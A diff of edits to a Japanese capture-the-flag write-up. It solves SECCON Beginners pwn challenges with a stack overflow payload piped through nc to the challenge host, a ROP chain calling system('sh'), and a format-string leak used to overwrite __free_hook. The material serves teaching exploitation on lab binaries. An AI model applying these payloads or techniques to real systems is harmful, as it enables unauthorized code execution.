@@ -16,7 +16,7 @@ Host: pwn1.chall.beginners.seccon.jp
 Port: 16268
 ```
 ## Solution
-実行すると名前を入力を求められる。適当に入れるとパーミッションないとのこと。
+実行すると名前の入力を求められる。適当に入れるとパーミッションないとのこと。
 ```S
 $ ./condition 
 Please tell me your name...AAAAAAAAAAA
@@ -24,7 +24,7 @@ Permission denied
 
 ```
 
-objdumpでmain関数をみてみる。getsで入力した値と0xdeadbeefを比較して同一であればフラグが表示される。
+objdumpでmain関数をみてみる。`gets`で入力した値と0xdeadbeefを比較して同一であればフラグが表示される。
 ```
 0000000000400771 <main>:
   400771:	55                   	push   rbp
@@ -51,7 +51,7 @@ objdumpでmain関数をみてみる。getsで入力した値と0xdeadbeefを比�
   4007ce:	e8 6d fe ff ff       	call   400640 <exit@plt>
 ```
 
-getsの入力はrbp-0x30から始まり、0xdeadbeefとの比較はrbp-0x4の値とおこなわれる。0x30-0x4 = 44バイトなので、44バイト適当にパディングして、0xdeadbeefを入力する。
+`gets`の入力はrbp-0x30から始まり、0xdeadbeefとの比較はrbp-0x4の値とおこなわれる。0x30-0x4 = 44バイトなので、44バイト適当にパディングして、0xdeadbeefを入力する。
 
 ```S
 $ python -c 'print "\x00"*44+"\xef\xbe\xad\xde"'|nc pwn1.chall.beginners.seccon.jp 16268
@@ -92,7 +92,7 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	bbs
 ```
 
-このバイナリでもgetsを使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
+このバイナリでも`gets`を使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
 ```S
 $ python -c 'print "A"*144'|./bbs 
 Input Content : 
@@ -130,7 +130,7 @@ gef➤  grep sh
   0x7ffff7a1e91c - 0x7ffff7a1e921  →   "shell" 
 ```
 
-PIEが無効な環境ではbssセクションは静的でかつ書き込み可能なため、このbssセクションを利用する。`gets`で`sh`文字列をbssセクションに書いて、その後`system`を呼ぶようなROPチェーンにすればよい。
+PIEが無効な環境では.bssセクションは静的な領域なため、このbssセクションを利用する。`gets`で`sh`文字列を.bssセクションに書いて、その後`system`を呼ぶようなROPチェーンにすればよい。
 ROPに必要な`pop rdi`ガジェット、bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
 
 * `pop rdi`ガジェット
@@ -212,14 +212,14 @@ Port: 21735
 
 ## Solution
 
-バイナリは32bit。checksecを見たところセキュリティーは厳しい。Full RELROなのでGOT Overwriteは出来ないし、PIEも有効なのでtextセクションもrandomizeされる。
+バイナリは32bit。checksecを見たところセキュリティー機構が厳しく設定されている。Full RELROなのでGOT Overwriteは出来ないし、PIEも有効なので.textセクションもrandomizeされる。
 ```
 $ checksec --file seczon 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes	0		6	seczon
 ```
 
-とりあえず適当に動かしてみているとcommentメニューのconfirmationの際にformat string bugが見つかった。`printf`にユーザーからの入力値をそのまま渡すようになっている場合に発生するバグで、スタック上や任意のアドレスにあるメモリー内容のリーク、また任意アドレスへの書き込みが出来てしまう。
+とりあえず適当に動かしてみるとcommentメニューのconfirmationの際にformat string bugが見つかった。`printf`にユーザーからの入力値をそのまま渡すようになっている場合に発生するバグで、スタック上や任意のアドレスにあるメモリー内容のリーク、また任意アドレスへの書き込みが出来てしまう。
 
 なお、このバグを疑ってかかる場合`%p %p %p %p`とか適当に入力して試せばよい。
 ```
@@ -258,7 +258,7 @@ gef➤  x/xw 0x56555cad
 gef➤  
 ```
 
-libcとtextのアドレスをリークできるので、事前にオフセットを確認してリークしたアドレスから実アドレスを求めればASLR及びPIEをバイパスできることがわかった。`system("sh")`の実行のための`system`関数を動的に求めることができる。
+libcと.textのアドレスをリークできるので、事前にオフセットを確認してリークしたアドレスから実アドレスを求めればASLR及びPIEをバイパスできることがわかった。`system("sh")`の実行のための`system`関数を動的に求めることができる。
 
 次にどうやって`system("sh")`を呼び出すかを考える。よくよくIDAやgdbを使ってみているとプログラム終了時にヒープ領域を`free`で解放しているコードがあった。
 
@@ -292,9 +292,9 @@ arg[1]: 0xf7fb83dc --> 0xf7fb91e0 --> 0x0
 [------------------------------------------------------------------------------]
 ```
 
-GOT Overwriteで`free`を`system`に書き換え、1番目のアイテムの名前に`sh`文字列を書いておけば、プログラム終了時に`system("sh")`が呼ばれる、ただし今回のバイナリはFull RELROのためGOT Overwriteは出来ない。よって`__free_hook`に`system`のアドレスを書き込んでおき、`free`が呼ばれた時に`system`をフックすることにした。
+Partial RELROの場合、GOT Overwriteで`free`を`system`に書き換え、1番目のアイテムの名前に`sh`文字列を書いておけば、プログラム終了時に`system("sh")`が呼ばれる。しかし今回のバイナリはFull RELROのためGOT Overwriteは出来ない。よって`__free_hook`に`system`のアドレスを書き込んでおき、`free`が呼ばれた時に`system`を実行できるようにした。
 
-`__free_hook`はlibcのメモリー領域にあるので、これも事前にオフセットを確認しておけば動的に求めることができる。よって下記手順にてエクスプロイトを作っていくことにした。textセクションのリークは不要になった。
+`__free_hook`はlibcのメモリー領域にあるので、これも事前にオフセットを確認しておけば動的に求めることができる。よって下記手順にてエクスプロイトを作っていくことにした。.textセクションのリークは不要になった。
 
 1. fsbでlibcのアドレス(`_IO_2_1_stdin`のアドレス)をリーク
 2. リークしたアドレスから`_IO_2_1_stdin`のオフセットを減算してlibcのベースアドレスを求める
